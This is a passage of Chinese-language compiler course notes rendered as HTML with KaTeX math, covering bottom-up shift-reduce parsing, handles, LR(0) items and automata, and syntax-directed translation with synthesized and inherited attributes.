class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord">&quot;</span></span></span></span></eq></li></ol></li><li><ol start="3"><li>如有不能按规则1与2构造的元素置出错标志<br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E6%9E%84%E9%80%A0%E5%88%86%E6%9E%90%E8%A1%A8%E4%BE%8B%E5%AD%90.jpg" alt="构造分析表例子"></li></ol></li></ul></li><li><p>二义性文法的分析表中存在冲突项，即通过一个符号由多个产生式</p></li></ul><h2 id="4(2)%E8%87%AA%E4%B8%8B%E8%80%8C%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90" tabindex="-1">4(2)自下而上的语法分析</h2><h3 id="%E8%87%AA%E4%B8%8B%E8%80%8C%E4%B8%8A%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90%E7%AE%80%E4%BB%8B" tabindex="-1">自下而上语法分析简介</h3><ul><li><p>基本思想</p><ul><li>推导——从输入的符号串开始逐步向上归约，试图归约到文法的开始/识别符号。</li><li>语法树——以输入符号串作为末端结点符号串，向根结点方向构造语法树，使识别符号正好是语法树的根结点。</li><li>程序的编译——从该高级语言文法的源程序或与其等价的单词串出发，试图归约到该文法的开始符号——&lt;程序&gt;</li></ul></li><li><p>基本实现技术——移进-归约法</p><ul><li>引进一个后进先出的栈来存放符号，按照扫描顺序把当前输入符号下推入栈中(移进)，然后查看栈顶的符号串是否可以被归约。</li></ul></li><li><p>短语： <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo><mover><mo><mo>⇒</mo></mo><mo lspace="0em" rspace="0em">∗</mo></mover></mo><mi>α</mi><mi>A</mi><mi>c</mi></mrow><annotation encoding="application/x-tex">S\stackrel{*}{ \Rightarrow } \alpha A c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9926em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9926em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop">⇒</span></span></span><span style="top:-3.5669em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord mathnormal">A</span><span class="mord mathnormal">c</span></span></span></span></eq>,且 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo><mover><mo><mo>⇒</mo></mo><mo lspace="0em" rspace="0em">+</mo></mover></mo><mi>β</mi></mrow><annotation encoding="application/x-tex">A\stackrel{+}{ \Rightarrow } \beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0752em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0752em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop">⇒</span></span></span><span style="top:-3.5669em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">+</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span></eq>,则称<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>β</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span></eq>是句型<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mi>A</mi><mi>c</mi></mrow><annotation encoding="application/x-tex">\alpha A c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord mathnormal">A</span><span class="mord mathnormal">c</span></span></span></span></eq>相对于<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>的短语</p><ul><li>若有<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>⇒</mo><mi>β</mi></mrow><annotation encoding="application/x-tex">A \Rightarrow \beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⇒</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span></eq>,则称<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>β</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span></eq>是句型<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mi>A</mi><mi>c</mi></mrow><annotation encoding="application/x-tex">\alpha A c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord mathnormal">A</span><span class="mord mathnormal">c</span></span></span></span></eq>相对于<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>的直接短语</li></ul></li><li><p>句型的最左直接短语称为句柄</p></li><li><p>在一个句型对应的语法树中</p><ul><li>以某非终结符为根的两代以上的字数的所有末端节点从左到右排列就是对于该非终结符的一个短语</li><li>如果子树只有两代，则短语为直接短语</li><li>最左的两代子树末端就是句柄</li></ul></li><li><p>LR文法采用句柄进行规约</p></li></ul><h3 id="lr(0)%E9%A1%B9%E7%9B%AE" tabindex="-1">LR(0)项目</h3><p>在每个产生式右部添加一个圆点，表示我们在分析过程中已经看到了产生式的哪些部分，以及我们希望下一个字符是什么</p><ul><li><p>如<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mi>X</mi><mi>Y</mi><mi>Z</mi></mrow><annotation encoding="application/x-tex">A\rightarrow XYZ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></eq>有四个项目</p><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mo separator="true">⋅</mo><mi>X</mi><mi>Y</mi><mi>Z</mi></mrow><annotation encoding="application/x-tex">A\rightarrow ·XYZ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mi>X</mi><mo separator="true">⋅</mo><mi>Y</mi><mi>Z</mi></mrow><annotation encoding="application/x-tex">A\rightarrow X·YZ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mi>X</mi><mi>Y</mi><mo separator="true">⋅</mo><mi>Z</mi></mrow><annotation encoding="application/x-tex">A\rightarrow XY·Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mi>X</mi><mi>Y</mi><mi>Z</mi><mo separator="true">⋅</mo></mrow><annotation encoding="application/x-tex">A\rightarrow XYZ·</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mpunct">⋅</span></span></span></span></eq></li></ul></li><li><p>称<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi><mo separator="true">⋅</mo></mrow><annotation encoding="application/x-tex">A\rightarrow \alpha ·</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4445em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mpunct">⋅</span></span></span></span></eq>为“规约项目”</p><ul><li>规约项目<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>S</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mo>→</mo><mi>α</mi><mo separator="true">⋅</mo></mrow><annotation encoding="application/x-tex">S^{&#x27;}\rightarrow \alpha ·</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9425em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4445em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mpunct">⋅</span></span></span></span></eq>，称为“接受项目”</li></ul></li><li><p><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi><mo separator="true">⋅</mo><mi>a</mi><mi>β</mi></mrow><annotation encoding="application/x-tex">A\rightarrow \alpha · a \beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span></eq> ,称为“移进项目”</p></li><li><p><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><mi>B</mi><mo separator="true">⋅</mo><mi>a</mi><mi>β</mi></mrow><annotation encoding="application/x-tex">A\rightarrow B · a \beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span></eq> ,称为“待约项目”</p></li><li><p>内核项：包括初始项<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>S</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mo>→</mo><mo separator="true">⋅</mo><mi>S</mi></mrow><annotation encoding="application/x-tex">S^{&#x27;}\rightarrow·S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9425em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq>以及点不再最左端的所有项</p></li><li><p>非内核项：除<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>S</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mo>→</mo><mo separator="true">⋅</mo><mi>S</mi></mrow><annotation encoding="application/x-tex">S^{&#x27;}\rightarrow·S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9425em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9425em;"><span style="top:-2.9425em;margin-right:0.05em;"><span class="pstrut" style="height:2.5795em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq>以外的点在最左端的所有项</p></li></ul><p>以LR(0)项目集为基础，构造LR(0)自动机，做出语法分析器</p><h4 id="lr(0)%E8%87%AA%E5%8A%A8%E6%9C%BA%E7%9A%84%E6%9E%84%E9%80%A0" tabindex="-1">LR(0)自动机的构造</h4><ul><li>构造分析表中的状态<br>假设I为文法的任一项目集(开始时仅包含S’→.S，S '为拓广文法的识别符号)，重复下述步骤求CLOSURE(I)：<ol><li>I的任何项目均属于CLOSURE(I)</li><li>如果A→α.Bβ属于CLOSURE(I)，则所有B→.γ也属于CLOSURE(I)。<br>上述工作重复到CLOSURE(I)不再扩大为止，此CLOSURE(I)即为所求的一个项目子集。</li></ol></li></ul><h4 id="%E6%B4%BB%E5%89%8D%E7%BC%80" tabindex="-1">活前缀</h4><ul><li><p>句柄的识别需要借助实际句型中的信息。在得到一个规范句型的完整句柄之前所识别的符号串称为规范句型的活前缀。</p></li><li><p>LR(0)自动机本质是DFA，那么就可以识别串，能被该自动机识别的串称为活前缀</p></li></ul><h4 id="lr(0)%E5%88%86%E6%9E%90%E8%A1%A8" tabindex="-1">LR(0)分析表</h4><p><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/LR(0)%E5%88%86%E6%9E%90%E8%A1%A8%E7%9A%84%E6%9E%84%E9%80%A0.jpg" alt></p><ul><li>移进规约冲突<ul><li>左结合选移进</li><li>右结合选归约</li></ul></li></ul><h2 id="5%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91" tabindex="-1">5语法制导翻译</h2><h3 id="%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91%E7%AE%80%E4%BB%8B" tabindex="-1">语法制导翻译简介</h3><ul><li>属性文法：对某个上下文无关文法，为每个文法符号指定一组属性，且为文法中的每个产生式附加一段属性计算方法——语义规则/语义动作/语义子程序，则称该文法为属性文法。<br>原文法称为基础文法<ul><li>属性值的计算，由语法分析过程中产生的语法分析树相应节点的环境推导出来 — 属性的联编/绑定<ul><li>静态属性：执行前联编，如数的有效位数</li><li>动态属性：在执行期间联编，如表达式的值</li></ul></li></ul></li><li>语法制导定义SDD<ul><li>定义与文法符号相关联的属性集</li><li>定义与产生式相关联的一组语义规则</li></ul></li><li>(语法制导的)翻译方案<ul><li>基本思想：在语法分析的过程中，依随分析的过程，根据每个产生式添加的语义动作进行翻译。一旦某个产生式被选用于推导或归约，就执行其相应的语义动作，完成预定的翻译工作</li></ul></li></ul><h3 id="%E5%B1%9E%E6%80%A7%E5%88%86%E7%B1%BB" tabindex="-1">属性分类</h3><ul><li><p>综合属性（自下而上得传递消息）</p><ul><li>语法规则上：根据产生式右部的符号属性计算左部被定义的符号的综合属性</li><li>语法树上：根据子节点的属性和父节点自身的属性计算父节点的综合属性</li></ul></li><li><p>继承属性（自上而下传递消息）</p><ul><li>语法规则上：根据右部候选式中的符号的属性和左部被定义的符号的属性计算右部候选式中符号的继承属性</li><li>语法树上：根据父节点和兄弟节点的属性计算子节点的继承属性</li></ul></li><li><p>终结符只有综合属性，并且这些综合属性由词法分析器提供</p></li><li><p>非终结符既有综合属性也可有继承属性，文法的开始符号没有继承属性，除非另加说明</p></li><li><p>文法符号的综合属性集合和继承属性集合的交集应该为空</p></li><li><p>对出现在产生式右边的继承属性和出现在产生式右边的综合属性都必须提供一个计算规则。属性计算规则中只能使用相应产生式中的文法符号的属性</p></li><li><p>出现在产生式左边的继承属性和出现在产生式右边的综合属性不由所给的产生式的属性计算规则计算，而是由其它产生式的属性规则计算或者由属性计算器的参数提供</p></li></ul><h3 id="sdd%E6%B1%82%E5%80%BC%E9%A1%BA%E5%BA%8F%EF%BC%8C%E5%B1%9E%E6%80%A7%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95" tabindex="-1">SDD求值顺序，属性计算方法</h3><ul><li>依赖图<br>用一个有向图描述了某个语法分析树中的属性实例之间的依赖关系，若属性x.a的值依赖于属性y.b的值，则加入一条同y.b到x.a的有向边</li></ul><h3 id="sdd-%E5%88%86%E7%B1%BB" tabindex="-1">SDD 分类</h3><ul><li>S-属性定义：仅使用综合属性的SDD<ul><li>可以按照语法分析树节点的任何自底向上的顺序来计算各个属性值</li></ul></li><li>L-属性定义<ul><li>一个SDD是L-属性，当且仅当它的每个属性要么都是综合属性(这里包含了S-属性)，要么是满足以下条件的继承属性<br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>→</mo><msub><mi>x</mi><mn>1</mn></msub><msub><mi>x</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>x</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">A\rightarrow x_1x_2...x_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">...</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,右部符号<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>的继承属性仅依赖于：<ol><li>A的继承属性</li><li>产生式中<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>左边<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>x</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">x_1,x_2,...x_{i-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></eq>的属性</li><li><eq><span class="katex"><span class="katex-mathml"><math 